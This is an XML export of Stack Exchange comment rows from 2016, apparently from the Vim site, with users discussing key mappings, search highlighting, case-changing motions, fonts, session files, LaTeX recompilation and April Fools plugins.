  <row Id="11605" PostId="7074" Score="1" Text="May want to consider a different key than `;` as `;` is rather useful. `;` repeats the last `t`/`f`. See `:h ;`" CreationDate="2016-03-29T14:12:09.350" UserId="778" />
  <row Id="11607" PostId="6976" Score="0" Text="@LucHermitte you're right, of course.&#xA;I was thinking about 'side effects' in general and didn't realize all of those already happened when I use `@/`..." CreationDate="2016-03-29T15:22:54.330" UserId="3343" />
  <row Id="11608" PostId="7082" Score="1" Text="Thanks, that was exactly what I needed!" CreationDate="2016-03-29T16:02:06.630" UserId="2920" />
  <row Id="11609" PostId="7083" Score="1" Text="This question and the answer actually helps: [What is the functional difference between :nohlsearch and :set nohlsearch?](http://vi.stackexchange.com/questions/3148/what-is-the-functional-difference-between-nohlsearch-and-set-nohlsearch) According to that post, `v:hlsearch` is a more reliable way to track the **hlsearch** state." CreationDate="2016-03-29T16:26:45.520" UserId="5328" />
  <row Id="11611" PostId="7083" Score="1" Text="@user9433424 Thanks. That is a fresh point of view, however, I am worried that location list or quickfix list might introduce issues related to other plugins using those resources and might be an overkill for just dealing with trailing spaces." CreationDate="2016-03-29T16:54:35.887" UserId="5328" />
  <row Id="11612" PostId="7083" Score="0" Text="After you found about `v:hlsearch`, which is indeed more reliable, is there anything else missing to implement `ShowWhiteSpace('ON')` (which could be renamed `ToggleShowWhiteSpace()` and avoid arguments)." CreationDate="2016-03-29T18:40:58.867" UserId="1405" />
  <row Id="11613" PostId="7083" Score="0" Text="@mMontu No. Should be all good. Will share the finals function here in a bit." CreationDate="2016-03-29T19:37:19.013" UserId="5328" />
  <row Id="11614" PostId="7083" Score="1" Text="If you're not familiar with the command window, try `q/`.  (NB: That's `q/` in normal mode, not `:q/`.)" CreationDate="2016-03-29T20:23:28.807" UserId="4676" />
  <row Id="11616" PostId="7083" Score="1" Text="I have added a prototype function. Sorry for the debug lines, just wanted to make sure that I check each stage. Might not be very optimised, any help in making this smarter is more than welcome." CreationDate="2016-03-29T20:45:59.513" UserId="5328" />
  <row Id="11617" PostId="7083" Score="2" Text="@symbolix It's probably best if you post your answer as an answer (and then accept it), rather than as an edit to the question. Answering your own question is fine, and this has the benefit of helping future visitors (who may now think that the question has no answer), and helps current visitors who can now easily see that this question has been solved." CreationDate="2016-03-29T21:00:21.780" UserId="51" />
  <row Id="11618" PostId="7082" Score="1" Text="I can confirm this works for MacVim/mvim as well." CreationDate="2016-03-29T21:03:24.930" UserId="7026" />
  <row Id="11619" PostId="7084" Score="0" Text="@Carpetsmoker I should be able to mark this as _answered_ in 2 days." CreationDate="2016-03-29T21:08:30.703" UserId="5328" />
  <row Id="11620" PostId="7083" Score="2" Text="Why exactly do you want to jump from trailing space to trailing space?" CreationDate="2016-03-29T21:08:52.410" UserId="54" />
  <row Id="11621" PostId="7083" Score="0" Text="@romainl I know it might be an overkill, but it is sometimes useful to quickly jump to those location. I admit it is a niche need." CreationDate="2016-03-29T21:11:36.673" UserId="5328" />
  <row Id="11622" PostId="7084" Score="1" Text="The problem with this solution is that once the trailing space is highlighted, as a search cheat, and we invoke another search on top of that with `/{pattern` then things are going to get messy :) I guess, a clean solution would be a quite complex one. So probably only keeping the trailing space highlighted and give up the `GoToNextTrailingSpace` functionality is the best option." CreationDate="2016-03-29T21:33:52.363" UserId="5328" />
  <row Id="11623" PostId="4302" Score="0" Text="As a worthy note, I've actually ended up using a tiny arrow for my tabs. Not as intrusive. `›`" CreationDate="2016-03-29T23:32:09.297" UserId="3164" />
  <row Id="11624" PostId="7085" Score="3" Text="You're running `gU` on the motion `iw`, which is inner word, meaning all of the word the cursor is currently on. Your first and second case are actually subtly different, since the first is &quot;capitalize all letters in the previous word&quot;, while the second case is &quot;capitalize all letters before the cursor but NOT the letter the cursor is on&quot;... Replacing `iw` with `b` will *almost* do what you want, but more logic is needed to do exactly what you want..." CreationDate="2016-03-30T02:18:45.910" UserId="51" />
  <row Id="11625" PostId="7085" Score="0" Text="can you try `gUb` instead of `gUiw` ?" CreationDate="2016-03-30T02:18:53.187" UserId="1616" />
  <row Id="11626" PostId="7085" Score="0" Text="@Carpetsmoker and @ sp asic Thanks for above comments!" CreationDate="2016-03-30T02:36:20.390" UserId="6267" />
  <row Id="11627" PostId="7085" Score="1" Text="in 1, if the cursor is really after `h`, then `gUb` will give you `abcd EFGH`. Is the cursor on `h` or after `h`?" CreationDate="2016-03-30T02:48:39.033" UserId="205" />
  <row Id="11628" PostId="7085" Score="0" Text="@muru, in insert mode, if I just type `efgh`, the cursor will after `h`, while to use `gUb`, I need switch to normal mode with &lt;ESC&gt;, then cursor will move on `h`, right?" CreationDate="2016-03-30T02:55:15.880" UserId="6267" />
  <row Id="11629" PostId="7087" Score="0" Text="It works for me! Thanks!" CreationDate="2016-03-30T03:10:36.980" UserId="6267" />
  <row Id="11630" PostId="7086" Score="5" Text="There's also `gUvb`. Take a look at `:help o_v` -- in short, it inverts whether the pending motion will be inclusive or exclusive. Backwards motions often omit the character the cursor appears to be on, and putting `v` between the operator and motion fixes that in most cases." CreationDate="2016-03-30T11:24:55.840" UserId="64" />
  <row Id="11631" PostId="7086" Score="3" Text="Also `gi` is a shorter way to return to last insert cursor position ... which gives something like `&lt;Esc&gt;gUvbgi` :)" CreationDate="2016-03-30T12:34:32.323" UserId="1800" />
  <row Id="11632" PostId="7091" Score="2" Text="Monaco is a OSX font − are you sure it's installed on your Windows machine? If I use `set guifont=Consolas` it seems to work (but the default font Gvim chooses doesn't!) Also, what exactly do you see? A question mark? Or a black block? Or something else?" CreationDate="2016-03-30T17:07:37.823" UserId="51" />
  <row Id="11633" PostId="7091" Score="1" Text="@Carpetsmoker: Thank you, changing the font to Consolas fixed my issue." CreationDate="2016-03-30T17:10:45.513" UserId="5469" />
  <row Id="11634" PostId="7092" Score="0" Text="Vim doesn't see any keycodes until you've completed the key chain (either as \`i or as \`&lt;Space&gt;), so there's little you can do in Vim. One thing you could maybe do is have AHK pick up on `&lt;Esc&gt;` and `i/a/A/o/O/` and start &quot;insert mode&quot; there when Vim is active. I have no idea if this is possible with AHK. Another fix is ditching AHK altogether and do this sort of stuff with Vim; which has the obvious drawback that it will work *only* in vim and not your other applications..." CreationDate="2016-03-30T17:31:10.800" UserId="51" />
  <row Id="11636" PostId="7094" Score="4" Text="High possibility this is because of this issue: https://github.com/vim-airline/vim-airline/issues/157" CreationDate="2016-03-30T19:21:53.220" UserId="20" />
  <row Id="11637" PostId="2060" Score="0" Text="what does `leader` mean?" CreationDate="2016-03-30T22:13:26.067" UserId="4513" />
  <row Id="11638" PostId="7097" Score="0" Text="What do you get with `:echo v:this_session`?" CreationDate="2016-03-31T06:34:42.813" UserId="54" />
  <row Id="11639" PostId="7086" Score="2" Text="@VanLaser would `&lt;Esc&gt;vbUgi` be equivalent?" CreationDate="2016-03-31T09:06:13.497" UserId="1616" />
  <row Id="11640" PostId="7086" Score="1" Text="Indeed! And I think that's the shortest solution yet! (i.e. the &quot;best&quot; one) :)" CreationDate="2016-03-31T09:30:04.057" UserId="1800" />
  <row Id="11641" PostId="7093" Score="0" Text="That doesn't help with &lt;kbd&gt;^&lt;/kbd&gt; and &lt;kbd&gt;&quot;&lt;/kbd&gt; which seem more important than &lt;kbd&gt;`&lt;/kbd&gt; and &lt;kbd&gt;'&lt;/kbd&gt;." CreationDate="2016-03-31T09:48:19.420" UserId="5469" />
  <row Id="11642" PostId="7103" Score="7" Text="`gq` and `gw` are normal commands: you can't enter them in command mode like `:gq...` that's why you get `Not an editor command`. You can use `normal gq` to use them in a script." CreationDate="2016-03-31T15:01:30.177" UserId="1841" />
  <row Id="11644" PostId="7094" Score="0" Text="@tokoyami I don't understand, do they give a solution in this issue ?" CreationDate="2016-03-31T17:44:46.653" UserId="7005" />
  <row Id="11645" PostId="7105" Score="1" Text="I'm curious if you would get the same error using Vim on the command line under Cygwin or MobaXterm (portable Unix-like environments for Windows).  I suspect not.  There may be a way to actually *fix* this so Windows `cmd` accepts the filename, but getting a Unix-like environment installed would be my own preferred handling." CreationDate="2016-03-31T19:38:18.330" UserId="4676" />
  <row Id="11646" PostId="7111" Score="0" Text="I _did_ read the vim-pandoc help and I _did_  see that line.  My confusion was mistaking visual mode as an equivalent mode to normal mode in this context.  Thank you." CreationDate="2016-03-31T20:34:31.530" UserId="7051" />
  <row Id="11647" PostId="7111" Score="0" Text="Ah, I see. Based on your last two questions then, it seems you are quickly running for a full vim setup tailored (at least) for markdown/pandoc, but the editor itself won't let you run *that* fast :) But maybe I'm wrong; in any case, good luck!" CreationDate="2016-03-31T20:41:20.010" UserId="1800" />
  <row Id="11648" PostId="7111" Score="2" Text="Thank you very much...I've never had so much fun editing text!" CreationDate="2016-03-31T20:42:47.073" UserId="7051" />
  <row Id="11649" PostId="7094" Score="1" Text="There is a workaround, [bling's second comment](https://github.com/vim-airline/vim-airline/issues/157#issuecomment-22912232). I don't know much about the status line configuration of airline though so I can't tell exactly how to apply it. If noone decides to tackle it, I can probably try during the weekend." CreationDate="2016-03-31T21:57:42.077" UserId="20" />
  <row Id="11650" PostId="7114" Score="0" Text="No luck, is there anything special I need to do to enable .tmux.conf in tmux?" CreationDate="2016-03-31T23:56:06.683" UserId="7052" />
  <row Id="11651" PostId="7114" Score="0" Text="I have modified the answer.  try again @OtisWright  let me know if it fails." CreationDate="2016-04-01T00:00:55.313" UserId="1691" />
  <row Id="11652" PostId="7114" Score="0" Text="@OtisWright give me more details about your shell and os you are using to run tmux and vim." CreationDate="2016-04-01T00:02:36.837" UserId="1691" />
  <row Id="11653" PostId="7114" Score="0" Text="Hey @byaruhaf I am using oh-my-zsh tmux and vim I am currently getting this error with those settings:&#xA;`/home/otis/.zshrc:4: parse error near `]]'`" CreationDate="2016-04-01T00:15:02.437" UserId="7052" />
  <row Id="11654" PostId="7114" Score="0" Text="Hey @OtisWright can you post your .zshrc on a  gist or any public paste site." CreationDate="2016-04-01T00:23:04.060" UserId="1691" />
  <row Id="11655" PostId="7114" Score="0" Text="https://gist.github.com/CrashyBang/53163b5bc63379b6e22712d021e756a9" CreationDate="2016-04-01T00:30:39.370" UserId="7052" />
  <row Id="11656" PostId="7114" Score="0" Text="Let us [continue this discussion in chat](http://chat.stackexchange.com/rooms/37791/discussion-between-byaruhaf-and-otis-wright)." CreationDate="2016-04-01T00:37:09.960" UserId="1691" />
  <row Id="11657" PostId="7115" Score="1" Text="You can also use `vim -R` or `view` to automatically open a file with `readonly` set (see [`:help -R`](http://vimhelp.appspot.com/starting.txt.html#%2dR))." CreationDate="2016-04-01T01:18:28.360" UserId="51" />
  <row Id="11658" PostId="7097" Score="0" Text="I get ~/session.vim. But I VanLaser's answer seems to solve the problem.  Thanks anyway." CreationDate="2016-04-01T01:53:07.137" UserId="7041" />
  <row Id="11659" PostId="7100" Score="0" Text="Indeed it is.  Hoodathunk.  Thanks!" CreationDate="2016-04-01T01:53:32.920" UserId="7041" />
  <row Id="11660" PostId="7116" Score="1" Text="Perhaps you should clarify what you mean by &quot;side effects&quot;?  For example, I personally would consider that if `u` *didn't* undo the last action, then that action had a very *undesirable* side effect (irreversible change).  But it seems that you think `u` being able to undo your change is a side effect...?" CreationDate="2016-04-01T03:05:52.247" UserId="4676" />
  <row Id="11661" PostId="7116" Score="2" Text="@Wildcard If I do `:set fileencoding=utf16`, `:w`, and then press `u`, then I don't &quot;undo&quot; the encoding change, I will undo the last change I made to the buffer. This is similar. To me, the `goimports` command is an unimportant detail in the process of writing the buffer to disk. It's not an &quot;action&quot;. I don't care about it. I never need to see it, care about it, or undo it, just like I don't need to see the fileencoding and many other details." CreationDate="2016-04-01T03:16:42.757" UserId="51" />
  <row Id="11662" PostId="7122" Score="3" Text="Write a book of jokes, using vim!" CreationDate="2016-04-01T09:47:06.790" UserId="6847" />
  <row Id="11663" PostId="7122" Score="3" Text="@loutre: A book of jokes about Vim? Like &quot;Vi has two modes: one where it beeps whenever you hit a key, and one where it deletes all the work you've done.&quot; :-)" CreationDate="2016-04-01T09:54:29.080" UserId="1841" />
  <row Id="11664" PostId="7122" Score="3" Text="I have a lot of fun with Vim, simply by using it efficiently." CreationDate="2016-04-01T10:01:55.200" UserId="54" />
  <row Id="11665" PostId="7123" Score="1" Text="reminded me of flappyvird - https://github.com/mattn/flappyvird-vim" CreationDate="2016-04-01T11:01:11.287" UserId="1616" />
  <row Id="11666" PostId="7121" Score="0" Text="If possible you should explain a little more what are the problems of installing `python.org Python` on the system. I'm not a mac user but it seems important." CreationDate="2016-04-01T11:54:07.543" UserId="1453" />
  <row Id="11667" PostId="7123" Score="0" Text="@spasic: I didn't know it but it totally fits the list!" CreationDate="2016-04-01T12:04:02.143" UserId="1841" />
  <row Id="11668" PostId="7117" Score="0" Text="On many Unices, the `view` binary is often a hard-link of the `vi` binary, and on those systems, even regular `vi`, when it sees it has been invoked as `view`, will open the file in read-only mode. So it's not vim-only" CreationDate="2016-04-01T12:18:56.340" UserId="1289" />
  <row Id="11669" PostId="7125" Score="4" Text="Your answer made me think that one could develop a plugin to help create and play regex crosswords like the ones on [this site](https://regexcrossword.com/). The plugin could read a crossword and highlight the characters placed wrongly :-)" CreationDate="2016-04-01T13:02:27.247" UserId="1841" />
  <row Id="11670" PostId="7125" Score="0" Text="Yes - anything sufficiently interesting to make the effort worthy :)" CreationDate="2016-04-01T13:09:43.257" UserId="1800" />
  <row Id="11671" PostId="7123" Score="1" Text="you could also watch the whole world through the [matrix plugin](http://www.vim.org/scripts/script.php?script_id=1189)" CreationDate="2016-04-01T13:37:12.243" UserId="1405" />
  <row Id="11672" PostId="7126" Score="2" Text="Your question is too broad right now. Do you already have a command to compile your latex files or are you looking for the `:Latekmk` command of [latex-box](https://github.com/vim-scripts/LaTeX-Box) plugin? Or are you looking for an [autocommand](http://vimdoc.sourceforge.net/htmldoc/autocmd.html#autocommand) to execute something on a file writing... Please clarify your question by indicating what you have searched and found so far." CreationDate="2016-04-01T13:39:29.733" UserId="1841" />
  <row Id="11673" PostId="7126" Score="0" Text="@statox edited question" CreationDate="2016-04-01T13:53:43.723" UserId="7061" />
  <row Id="11674" PostId="7126" Score="3" Text="There are latex commands that auto-(re)compile your file(s) each time they change, outside &amp; independent of Vim. Study that ;)" CreationDate="2016-04-01T13:53:58.760" UserId="1800" />
  <row Id="11675" PostId="7127" Score="0" Text="The entr tool seems pretty interesting but in this case why would you recommend it more than an autocommand like `autocmd FileWritePost *.tex Latexmk`?" CreationDate="2016-04-01T14:03:55.790" UserId="1841" />
  <row Id="11676" PostId="7127" Score="0" Text="Because I prefer to use specialized tools." CreationDate="2016-04-01T14:31:14.380" UserId="54" />
  <row Id="11677" PostId="7116" Score="1" Text="[vim-go](https://github.com/fatih/vim-go) provides `:GoImports` which will automatically discards/add import path based on the code. You can set it so `goimports` is ran on save by adding  `let g:go_fmt_command = &quot;goimports&quot;` to your `vimrc` file." CreationDate="2016-04-01T14:48:35.917" UserId="778" />
  <row Id="11678" PostId="7126" Score="0" Text="(I.e. you could start from something like `latexmk -pdf -pvc file.tex`)" CreationDate="2016-04-01T14:55:53.237" UserId="1800" />
  <row Id="11679" PostId="7126" Score="0" Text="@VanLaser may god bless you" CreationDate="2016-04-01T15:46:21.240" UserId="7061" />
  <row Id="11680" PostId="7120" Score="2" Text="As a mnemonic think of `H`, `M`, and `L` as high, middle, and low" CreationDate="2016-04-01T15:59:51.097" UserId="778" />
  <row Id="11681" PostId="7117" Score="0" Text="@OlivierDulac, perhaps not, but I don't see it specified in POSIX—either [for `ex`](http://pubs.opengroup.org/onlinepubs/9699919799/utilities/ex.html) or [for `vi`](http://pubs.opengroup.org/onlinepubs/9699919799/utilities/vi.html).  `vi -R` *is* specified." CreationDate="2016-04-01T16:22:07.907" UserId="4676" />
  <row Id="11682" PostId="7117" Score="0" Text="Good point. Upvoted." CreationDate="2016-04-01T17:38:49.283" UserId="1289" />
  <row Id="11683" PostId="7129" Score="0" Text="Are you by any chance &quot;lazy&quot;-loading the UltiSnips plugin? Perhaps the cause is *not* related to unprintable characters, but with plugin loading &quot;moment&quot;." CreationDate="2016-04-01T18:03:20.013" UserId="1800" />
  <row Id="11684" PostId="7119" Score="0" Text="See also `vimtutor`, for more." CreationDate="2016-04-01T18:11:23.713" UserId="1800" />
  <row Id="11685" PostId="7120" Score="0" Text="@PeterRincker that's the natural interpretation. Any idea why the help text preferred Home/Middle/Last?" CreationDate="2016-04-01T18:23:57.283" UserId="205" />
  <row Id="11686" PostId="7129" Score="0" Text="Yeah, the developer of UltiSnips thinks it's not a problem with unprintable characters, either. However, it's weird that those characters are being inserted. Any idea why that would be? I'm using Vundle to manage my plugins. It does not allow me to load UltiSnips lazily like NeoBundle does. So, no, I'm not lazily loading them. They are being loaded as soon as a session is restored." CreationDate="2016-04-01T18:35:57.663" UserId="2062" />
  <row Id="11687" PostId="7129" Score="1" Text="Why do you think it's weird? This is the default behavior." CreationDate="2016-04-01T18:41:20.257" UserId="54" />
  <row Id="11688" PostId="7129" Score="0" Text="Really? Why are there `device control 2` characters, above, and `end of medium` characters? See [this table](http://academic.evergreen.edu/projects/biophysics/technotes/program/ascii_ctrl.htm) if you're not familiar with control-key sequences (I'm not familiar)." CreationDate="2016-04-01T18:51:49.660" UserId="2062" />
  <row Id="11689" PostId="7129" Score="1" Text="In Vim, you can literally type `Ctrl-V` `Enter` to get something equivalent to what you would otherwise type as &quot;\r&quot;, &quot;\n&quot;, &quot;\&lt;CR&gt;&quot; etc. (depending on context). Vim would then show this as &quot;^V^M&quot;, which actually means &quot;literally a carriage return&quot;. What I see in your screenshot *is* what UltiSnips author told you - Vim representation of raw characters, replacing (but equivalent) to the ones you specified in your maps." CreationDate="2016-04-01T20:09:00.640" UserId="1800" />
  <row Id="11690" PostId="7129" Score="1" Text="Right, I totally understand that much. What I don't understand is why those raw characters would be in my session file. Newlines, carriage returns, line feeds, those are understandable. `bel`, `device control 2`, `end of medium` characters don't belong in a session file as far as I can determine. That's what this question is asking: Why are weird (i.e. not formatting/newline characters, but other strange raw characters) showing up in my session file?" CreationDate="2016-04-01T20:47:13.490" UserId="2062" />
  <row Id="11691" PostId="7131" Score="1" Text="Don't forget about [codegolf.se]!" CreationDate="2016-04-01T22:11:04.313" UserId="7068" />
  <row Id="11696" PostId="7137" Score="0" Text="Works great, thanks.  I'm assuming the characters in range (192-255) are not normal ascii. is that some kind of &quot;extended ascii&quot;?" CreationDate="2016-04-01T23:27:40.757" UserId="4603" />
  <row Id="11697" PostId="7125" Score="0" Text="@statox, that is an *awesome* site, thank you for linking to it!  :D" CreationDate="2016-04-02T00:43:33.313" UserId="4676" />
  <row Id="11698" PostId="7132" Score="3" Text="So...what does it do?" CreationDate="2016-04-02T00:44:16.143" UserId="4676" />
  <row Id="11699" PostId="7132" Score="1" Text="Not tested, but I'd say it shuffles vim keys randomly. Talk about a steep learning curve..." CreationDate="2016-04-02T01:01:58.710" UserId="7072" />
  <row Id="11700" PostId="7139" Score="0" Text="Are these figures text files? How do you expect to see them in a text editor, Vim or Emacs?" CreationDate="2016-04-02T02:06:36.147" UserId="205" />
  <row Id="11701" PostId="7141" Score="0" Text="Very informative. Many thanks" CreationDate="2016-04-02T02:50:01.297" UserId="390" />
  <row Id="11702" PostId="7143" Score="0" Text="interesting, I assumed vim uses the term &quot;keyword&quot; in the variable  &quot;iskeyword&quot; (rather than &quot;isword&quot; ) because the iskeyword group serves more purposes than just motions, e.g. completions etc." CreationDate="2016-04-02T03:57:41.067" UserId="4603" />
  <row Id="11703" PostId="3510" Score="0" Text="I agree that this is a problem because I just wrote a routine that scans up and down (the purpose is to auto-readjust window heights to fit to content if it fits) and profiling shows that `wincmd j` or `k` are eating up LOTS of time by actually going and switching the focused window. I simply need to fetch for each window both its dimensions and its offset. (and its buffer line count but that's easy) Without actually physically switching to these windows." CreationDate="2016-04-02T04:30:19.587" UserId="390" />
  <row Id="11704" PostId="7138" Score="1" Text="http://vim.wikia.com/wiki/Integrate_gvim_with_Visual_Studio" CreationDate="2016-04-02T07:59:55.667" UserId="54" />
  <row Id="11705" PostId="7132" Score="2" Text="@Wildcard Try it. It's fun! ;-)" CreationDate="2016-04-02T11:26:23.463" UserId="51" />
  <row Id="11706" PostId="7131" Score="0" Text="@cat I second that. Vim isn't exactly a &quot;programming language&quot; but I've used it for code golf, and it works great!" CreationDate="2016-04-02T14:48:46.850" UserId="2920" />
  <row Id="11707" PostId="7131" Score="0" Text="@DJMcMayhem [Actually, for the purposes of PPCG, Vim (the editor controls / commands) and Vimscript (the programming language) are both valid languages, and Vim is actually quite competitive :D](http://meta.codegolf.stackexchange.com/a/4817/46231)" CreationDate="2016-04-02T15:06:33.220" UserId="7068" />
  <row Id="11708" PostId="7131" Score="0" Text="@cat I know vim is quite competitive! http://codegolf.stackexchange.com/a/74717/31716" CreationDate="2016-04-02T15:09:12.860" UserId="2920" />
  <row Id="11709" PostId="7131" Score="1" Text="@DJMcMayhem Oooh, I failed to recognise the anagram username :P" CreationDate="2016-04-02T15:10:44.457" UserId="7068" />
  <row Id="11710" PostId="7131" Score="0" Text="@cat Haha. If you like vim golf, checkout http://codegolf.stackexchange.com/q/71030/31716" CreationDate="2016-04-02T15:46:59.733" UserId="2920" />
  <row Id="11711" PostId="7152" Score="0" Text="A bit late to join in the fun..." CreationDate="2016-04-02T17:05:46.960" UserId="7085" />
  <row Id="11712" PostId="7150" Score="0" Text="Thank you. &quot;:&lt;C-U&gt;&quot; did the trick. Also, the comment I've added it only for this question, to make it more clear what I was going for." CreationDate="2016-04-02T17:09:36.173" UserId="3405" />
  <row Id="11713" PostId="7154" Score="0" Text="Yes you're right that if i just use `WinEnter` without using the tip I linked that it will trigger when a window is closed because closing one means i enter *another* one. But the routine I want to run is too slow for me to justify doing this. In particular if I move around a window without resizing or opening or closing any of them, it will also run `WinEnter`. I want it to run only when a window closes." CreationDate="2016-04-02T19:41:10.450" UserId="390" />
  <row Id="11714" PostId="7154" Score="0" Text="I agree my method is acceptable only with very fast and minimal commands, like my example.  &#xA;Sorry I can't help more than that, I didn't understand how do you want to change the windows when one is closed" CreationDate="2016-04-02T19:45:50.070" UserId="7087" />
  <row Id="11715" PostId="5556" Score="0" Text="available here https://github.com/eiginn/netrw" CreationDate="2016-04-02T20:39:47.370" UserId="5961" />
  <row Id="11716" PostId="7139" Score="0" Text="No, the figures are matlab figures with `.fig` extension." CreationDate="2016-04-02T21:22:23.830" UserId="7071" />
  <row Id="11718" PostId="7155" Score="1" Text="Related question on SO with a workaround using `.Xresources`: http://stackoverflow.com/a/2179779/4194289" CreationDate="2016-04-02T21:36:36.347" UserId="1841" />
  <row Id="11719" PostId="7123" Score="0" Text="@mMontu: unfortunately the plugin doesn't seems to work properly on my system and I don't have time to debug that but that seems like a cool plugin! :-)" CreationDate="2016-04-02T21:39:21.000" UserId="1841" />
  <row Id="11720" PostId="7125" Score="1" Text="@Wildcard Well you're welcome! A friend of mine showed it to me some days ago and I found the idea pretty cool!" CreationDate="2016-04-02T21:40:27.333" UserId="1841" />
  <row Id="11721" PostId="7132" Score="0" Text="@Carpetsmoker Now that's a whole new level of evil... I like it! :-)" CreationDate="2016-04-02T21:42:11.843" UserId="1841" />
  <row Id="11722" PostId="7152" Score="0" Text="It's never too late to join the fun :-)" CreationDate="2016-04-02T21:44:20.247" UserId="1841" />
  <row Id="11724" PostId="7154" Score="0" Text="I have added a video to demo what I mean in OP." CreationDate="2016-04-02T21:47:51.160" UserId="390" />
  <row Id="11725" PostId="7153" Score="0" Text="I think I can fix both of my issues (1. aucmd for new window runs too early before the buffer loads, 2. no aucmd for closing a window) by hooking WinEnter and maybe BufEnter, and using some tab/global variables to latch in order to only run my routine when it is the right time to run it." CreationDate="2016-04-02T21:57:46.310" UserId="390" />
  <row Id="11726" PostId="7153" Score="1" Text="Rather than hacking around with VimScript, this sounds like the sort of thing that's best fixed with a patch to create new autocommands. [Here's a basic version I quickly created](https://bitbucket.org/snippets/Carpetsmoker/LRa7M), which seems to work (but isn't tested extensively!) I don't use windows much, so I don't have much incentive to finish this up. The code is public domain, so anyone is free to &lt;s&gt;steal&lt;/s&gt; use it and finish it up ;-)" CreationDate="2016-04-03T00:25:28.360" UserId="51" />
  <row Id="11727" PostId="7153" Score="0" Text="Well, I think that once i figure out the behavior/algorithms that make the most sense for the window adjustment, a nice next step is to possibly integrate it into vim itself. I feel like just adding a new autocommand only gets me maybe 20% of the way to what I am envisioning anyway." CreationDate="2016-04-03T00:49:30.637" UserId="390" />
  <row Id="11728" PostId="7153" Score="0" Text="@Carpetsmoker Really do appreciate you sharing that patch though! Now I'll know exactly where to look when I decide to throw up my hands and implement this. Now, still have to find out where to go to do the same in neovim..." CreationDate="2016-04-03T02:19:21.170" UserId="390" />
  <row Id="11729" PostId="7122" Score="1" Text="I'm closing this question as off-topic because April fools is over. No more fun allowed now! :p" CreationDate="2016-04-03T02:34:51.637" UserId="51" />
  <row Id="11730" PostId="7159" Score="1" Text="Are you aware that this is a plug-in for atom and not for Vim?" CreationDate="2016-04-03T03:58:48.870" UserId="1841" />
  <row Id="11731" PostId="7157" Score="1" Text="The idea is pretty funny actually :-)" CreationDate="2016-04-03T04:00:25.737" UserId="1841" />
  <row Id="11732" PostId="7105" Score="2" Text="From what I read, the default for `cmd.exe` isn't unicode, but [code page 850](http://superuser.com/q/269818/71885). [Also see this answer](http://stackoverflow.com/q/1259084/660921)." CreationDate="2016-04-03T05:02:36.037" UserId="51" />
  <row Id="11733" PostId="7160" Score="2" Text="Side note: you might want to explore the vim color themes as well. Perhaps you'd find one that looks nice with your settings. Type `:color` and tab through the possible arguments. I use a black background for my terminal (with gray text) and I personally like the `desert` theme." CreationDate="2016-04-03T05:26:07.230" UserId="850" />
  <row Id="11734" PostId="7157" Score="1" Text=":-D ha ha it's the simple things in life" CreationDate="2016-04-03T06:18:02.553" UserId="1717" />
  <row Id="11736" PostId="7164" Score="0" Text="Thanks, not sure if i should delete. Clearly this behavior is not intended behavior so I just need to debug it now." CreationDate="2016-04-03T06:21:50.217" UserId="390" />
  <row Id="11737" PostId="7164" Score="2" Text="Don't delete. Debug and find out, and if you do find something, please post an answer." CreationDate="2016-04-03T06:26:42.423" UserId="205" />
  <row Id="11738" PostId="7164" Score="0" Text="I am doing it now. Its caused by one of my 40 or so plugins, I am just having trouble keeping track of my manual binary searching." CreationDate="2016-04-03T06:30:49.580" UserId="390" />
  <row Id="11739" PostId="7166" Score="1" Text="Your title says `ctrl+i` and your question says `ctrl+e`, what are you talking about exactly?  The normal behavior is that `ctrl+o` goes backward in the jumplist and `ctrl+i` goes forward and the jumplist contains the previous locations so it is normal that the file opened in previous vim sessions are available. Now `ctrl-e` is made to scroll downward in the file. If you got a different behavior, make sure that you don't have mappings which change this." CreationDate="2016-04-03T08:28:41.823" UserId="1841" />
  <row Id="11740" PostId="7167" Score="0" Text="Where do you want to jump if there's no closing tag?" CreationDate="2016-04-03T08:47:21.827" UserId="54" />
  <row Id="11741" PostId="7164" Score="2" Text="Forty freaking plugins…" CreationDate="2016-04-03T08:49:03.823" UserId="54" />
  <row Id="11742" PostId="7160" Score="1" Text="Syntax highlighting is off by default. If you don't want it, why do you even enable it?" CreationDate="2016-04-03T08:50:52.367" UserId="54" />
  <row Id="11743" PostId="7164" Score="0" Text="@romainl I counted them the proper way and it's actually 51 plugins ([2400 or so lines](https://github.com/unphased/vim-config/blob/master/.vimrc))" CreationDate="2016-04-03T08:53:18.343" UserId="390" />
  <row Id="11744" PostId="7122" Score="1" Text="@Carpetsmoker  But... but.... but...... No more fun? :-(" CreationDate="2016-04-03T09:00:29.240" UserId="7085" />
  <row Id="11745" PostId="7166" Score="0" Text="It's clear from the context that the OP means `Ctrl+i`, so I edited the question." CreationDate="2016-04-03T09:09:16.397" UserId="1800" />
  <row Id="11746" PostId="7159" Score="0" Text="A similar plug-in for Vim is present [here](https://github.com/mattn/vim-particle) but it seems that it only works on gVim under Windows." CreationDate="2016-04-03T09:09:21.613" UserId="1841" />
  <row Id="11747" PostId="7164" Score="0" Text="Fifty one freaking plugins…" CreationDate="2016-04-03T09:15:17.867" UserId="54" />
  <row Id="11749" PostId="7160" Score="0" Text="@Shabaz Thank you for your helpful remarks. I will explore the themes, and maybe find something appropriate. :-)" CreationDate="2016-04-03T09:18:48.023" UserId="1705" />
  <row Id="11750" PostId="7162" Score="1" Text="Hmm... I think I still want to see bold. I think I was able to see bold and some other formats with vim-tiny, so I wouldn't want to completely lose functionality. Thanks for your helpful answer." CreationDate="2016-04-03T09:22:27.417" UserId="1705" />
  <row Id="11751" PostId="7160" Score="0" Text="@romani You are incorrect. Sytntax colors were enabled by default when I installed vim-nox. If I knew how to enable/disable them I wouldn't have asked the question, naturally. I edited my question to better explain what happened." CreationDate="2016-04-03T09:24:07.533" UserId="1705" />
  <row Id="11752" PostId="7167" Score="0" Text="No my issue is the first scene has a closing tag, but if i try to jump it does not." CreationDate="2016-04-03T09:27:14.373" UserId="3003" />
  <row Id="11753" PostId="7164" Score="1" Text="When I think that I found my 15 plug-ins were too much and I should remove some..." CreationDate="2016-04-03T10:04:37.903" UserId="1841" />
  <row Id="11754" PostId="7167" Score="0" Text="I can't explain why but I confirm this behavior: without the self closing tags `&lt;Scene.*/&gt;`, `%` works properly and with them the matching doesn't work anymore. The weird part is that it seems to be happening only on your example file, because I have other html files with self closing tags and `%` behaves properly in them... Maybe it is due to the fact that all your tags are `Scene` but that seems weird." CreationDate="2016-04-03T10:37:52.737" UserId="1841" />
  <row Id="11756" PostId="7165" Score="1" Text="I have seen your issue on github. Probably that plugin should have used `augroups` to set the triggers etc. Let's see if it gets fixed." CreationDate="2016-04-03T10:46:26.090" UserId="5328" />
